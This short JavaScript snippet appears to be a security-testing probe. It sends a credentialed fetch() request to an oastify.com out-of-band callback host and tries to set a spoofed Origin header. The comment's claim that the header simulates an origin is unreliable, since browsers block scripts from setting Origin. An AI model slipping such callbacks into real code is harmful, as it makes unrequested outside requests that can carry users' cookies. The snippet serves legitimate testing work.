fetch("https://t3xd8evnpec2yy7fz0p13pgc43auyqmf.oastify.com", {
  method: "GET",
  credentials: "include", // ensures cookies are sent if same-origin or CORS allows it
  headers: {
    "Origin": "https://example.com" // replace with the origin you want to simulate
  }
})
  .then(response => response.text())
  .then(data => console.log("Response:", data))
  .catch(error => console.error("Error:", error));
